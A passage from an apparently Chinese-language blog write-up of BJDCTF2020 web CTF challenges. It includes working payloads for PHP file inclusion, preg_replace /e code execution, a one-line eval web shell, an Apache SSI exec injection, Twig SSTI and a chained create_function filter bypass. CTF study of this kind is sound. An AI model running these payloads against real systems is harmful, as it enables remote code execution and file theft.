class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>这个可变变量把我给绕晕了。。。可以看看<a href="https://www.gem-love.com/ctf/824.html#Mark_loves_cat" target="_blank" rel="noopener">L’Amore大佬的wp</a></p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200929170242835.png" alt></p>
<h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>看了看题目，应该是zjctf某道题的改编，首先找到zjctf的题目。</p>
<p>第一层是一样的，使用data://绕过。payload：</p>
<p><code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</code></p>
<p>接着看到include函数想到文件包含。</p>
<p>payload：<code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200929181134817.png" alt="image-20200929181134817"></p>
<p>将base64解码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚开始发现getFlag函数定义了没有执行，猜测是使用complex函数来执行这个函数，但是看了好久还是没思路。。。</p>
<p>然后看了wp才知道preg_replace在/e模式下的RCE</p>
<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></p>
<p>payload：<code>?\S*=${getflag()}&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
<p>当然，都RCE了，也可以一句话木马直接上蚁剑</p>
<p><code>?\S*=${eval($_POST[kite])}</code></p>
<h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>看到题目的search想到源码泄露，访问index.php.swp得到部分源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一层直接爆破：</p>
<p>自己写的垃圾脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9999999999</span>; $i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5($i),<span class="number">0</span>,<span class="number">6</span>) == <span class="string">"6d0bc1"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"yes"</span>.<span class="string">"\n"</span>.$i;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($i%<span class="number">1000000</span> == <span class="number">0</span>) <span class="keyword">echo</span> <span class="string">"***"</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/28/BJDCTF2020/image-20200929211713316.png" alt="image-20200929211713316"></p>
<p>登陆成功:</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20200929211756697.png" alt></p>
<p>在响应标头里找到随机生成的url：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004165154451.png" alt></p>
<p>打开：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004165223729.png" alt></p>
<p>然后是一个新的知识点：<a href="https://www.zhangfangzhou.cn/apache-ssi-configuration.html" target="_blank" rel="noopener">Apache 开启SSI配置使shtml支持 include()和SSI Shell漏洞问题</a></p>
<p>本题中没有过滤，直接在username里打就可以了：</p>
<p><code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code></p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004171037689.png" alt="image-20201004171037689"></p>
<p><code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code></p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004171201673.png" alt="image-20201004171201673"></p>
<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>老图了：</p>
<p><img src="/2020/09/28/BJDCTF2020/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg" alt="preview"></p>
<p>依次测试： <code>${7*7}</code>，返回<code>${7*7}</code>，不通过；测试<code>49</code>，返回49，通过；测试 <code>49</code>，返回49,判断模板为twig(如果是jinja2返回<code>7777777</code>，并且twig是php，jinja是python)</p>
<p>知识点链接：<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig" target="_blank" rel="noopener">一篇文章带你理解漏洞之SSTI漏洞/#2-Twig</a></p>
<p>hint:</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004222013695.png" alt></p>
<p>根据文章得到payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004221654162.png" alt></p>
<h2 id="EzPHP"><a href="#EzPHP" class="headerlink" title="EzPHP"></a>EzPHP</h2><blockquote>
<p>ez不一定ez，但是hard是真的hard</p>
</blockquote>
<p>hint：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004223440325.png" alt></p>
<p>base32解码：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201004223456332.png" alt></p>
<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>先看一下第一层过滤：<a href="https://blog.csdn.net/fjb2080/article/details/80548431" target="_blank" rel="noopener">有关$_SERVER的知识</a></p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201009192644228.png" alt="image-20201009192644228"></p>
<p>所以本题中$_SERVER[‘QUERY_STRING’]过滤的是get的参数，直接用url编码绕过即可，有一个小坑就是：一般网上的在线url编码/解码不会对字母数字进行编码，因为：</p>
<blockquote>
<p>“…Only alphanumerics [0-9a-zA-Z], the special characters “$-<em>.+!*’(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.”</em></p>
<p>“只有字母和数字[0-9a-zA-Z]、一些特殊符号”$-_.+!*’(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。”</p>
</blockquote>
<p>一般来说这些字符的url编码就是ascii码前面加个<code>%</code>,具体参考：<a href="https://www.w3school.com.cn/tags/html_ref_urlencode.htm" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_urlencode.htm</a></p>
</li>
<li><p>第二层过滤又要在debu中正则匹配到”aqua_is_cute”并且用^和$卡住了两端，又要求debu !== “aqua_is_cute” ，看似不可能，但是结尾没有<code>/D</code>的话，<code>$</code>会省略句尾的<code>%0a</code>。所以只需要传入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debu=aqua_is_cute%0a</span><br></pre></td></tr></table></figure>

<p>再url编码一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三层过滤是看看$_REQUEST中有没有英文字母，即使是url编码，因为是16进制，所以依然会有英文字母的出现，这里涉及到$_REQUEST的一个特性(bug)：当GET和POST都存在同一个变量名的时候，只获取POST中的值，所以可以通过这个特性来绕过正则的匹配。如图：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201009195949155.png" alt></p>
</li>
<li><p>第四层：<code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)</code>就是要在$file中写入“debu_debu_aqua”，可以用php://input或者data://text/plain,(url编写内容)绕过，参考：<a href="http://blog.sina.com.cn/s/blog_8a65767d0102v94a.html" target="_blank" rel="noopener">PHP file_get_contents 绕过</a></p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201009205036230.png" alt></p>
</li>
<li><p>第五层：<a href="https://blog.csdn.net/cyyAray/article/details/78340241" target="_blank" rel="noopener">PHP 中的sha1()和MD5()函数漏洞</a></p>
<p>当传入?shana[]&amp;passwd[]=123时，他俩的sha1都为null，但是两者不相等。</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201009205507311.png" alt="image-20201009205507311"></p>
</li>
<li><p>第六层，也是最后一层了。</p>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/58713380" target="_blank" rel="noopener">代码审计从入门到放弃(一) &amp; function</a></p>
<p>从参考文章可知，<code>&amp;5c</code>即<code>\</code>打头时可以正常运行var_dump()，但是。。。本题中变量code和arg没办法get。。。</p>
<p>然后我发现在sha1过滤的地方会执行一个extract函数（刚开始还没看见，找了好久。。。）这是一个经典的变量覆盖的问题。</p>
<p>不过也有个小坑，就是刚开始不知道如何变量覆盖，网上的资料基本都是<code>extract($_GET);</code>，直接传入<code>code=xxx&amp;arg=xxx</code>即可；这里的<code>extract($_GET[&quot;flag&quot;]);</code>需要传入<code>flag[code]=xxx&amp;flag[arg]=xxx</code></p>
<p>输入<code>flag[code]=%5cvar_dump&amp;flag[arg]=23333</code>（url编码之后为：<code>%66%6c%61%67%5b%63%6f%64%65%5d=%5c%76%61%72%5f%64%75%6d%70&amp;%66%6c%61%67%5b%61%72%67%5d=2333</code>）进行测试:</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201010111707519.png" alt="奇奇怪怪的东西是flag.php的内容"></p>
<p><code>灏卞湪杩欓噷锛屼綘鑳芥嬁鍒板畠鍚楋紵</code></p>
<p>F12：<img src="/2020/09/28/BJDCTF2020/image-20201010114813584.png" alt="image-20201010114813584"></p>
<p>到这里思路就断了，以为这些生僻字是flag，但是看了wp之后才发现不是。在<code>$code(&#39;&#39;, $arg);</code>处没有执行任何指令，我还以为被ban的函数这么多，不需要绕过，以及include了flag.php，以及出现了flag字样，导致我以为flag出了，后面是个misc。</p>
<p>顺着wp的思路往下：因为include了flag.php，所以可以用<code>get_defined_vars()</code>将所有变量dump出来</p>
<p>本来想试试能不能不利用create_function直接dump，后面发现不行：<img src="/2020/09/28/BJDCTF2020/image-20201010155027164.png" alt></p>
<p>因为此时执行的是<code>var_dump(&#39;&#39;,&#39;get_defined_vars()&#39;)</code>，所以还是得利用create_function，原理解析：<a href="https://paper.seebug.org/94/" target="_blank" rel="noopener">[科普向] 解析create_function() &amp;&amp; 复现wp</a></p>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</span><br><span class="line">url编码之后为：%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f</span><br></pre></td></tr></table></figure>

<p>（刚开始以为过滤了<code>}</code>,但是仔细看看发现只过滤了<code>{</code>。。。以及，为什么code不需要<code>%5c</code>）</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201010160637448.png" alt></p>
<p>将所有变量dump出来之后发现提示真正的flag在rea1fl4g.php</p>
<p>因为过滤了include，所以可以用require代替include，将rea1fl4g.php包含进来，并且过滤了<code>·</code>，可以用base64绕过</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag[code]=create_function&amp;flag[arg]=&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</span><br><span class="line">cmVhMWZsNGcucGhw:rea1fl4g.php的base64编码</span><br><span class="line">url编码之后为：</span><br><span class="line">%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f</span><br></pre></td></tr></table></figure>

<p>然后得到了一个假的flag：（脸上笑嘻嘻</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201010161925745.png" alt="image-20201010161925745"></p>
<p>根据wp，预期解是取反绕过：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[code]=create_function&amp;flag[arg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>

<p>最后终于拿到flag：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201010164915050.png" alt="image-20201010164915050"></p>
</li>
</ol>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>首先找到hint：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201011110916069.png" alt="image-20201011110916069"></p>
<p>顺着hint随便找了篇文章：<a href="https://blog.csdn.net/phpfenghuo/article/details/12853031" target="_blank" rel="noopener">php获取客户端IP地址的几种方法</a></p>
<p>测试了一下发现是XFF：</p>
<p><img src="/2020/09/28/BJDCTF2020/image-20201011111624007.png" alt="image-20201011111624007"></p>
<p>因为先做了Cookie is so stable这一题，两个页面差不多，连hint的位置都一样，所以先考虑SSTI，</p>

      
       
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>BJDCTF2020</p>
    
    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Kyle">Kyle</a></p>
    <p><span class="copy-title">发布时间:</span>2020-09-28, 14:42:08</p>
    <p><span class="copy-title">最后更新:</span>2020-10-11, 19:07:56</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/09/28/BJDCTF2020/" title="BJDCTF2020">https://silver2835.github.io/2020/09/28/BJDCTF2020/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2016-2019 Yelog</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" href="javascript:void(0)"></a>
    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#wp','#web','#Clion','#hexo','#Minecraft','#markdown','#misc',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: #fafafa;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
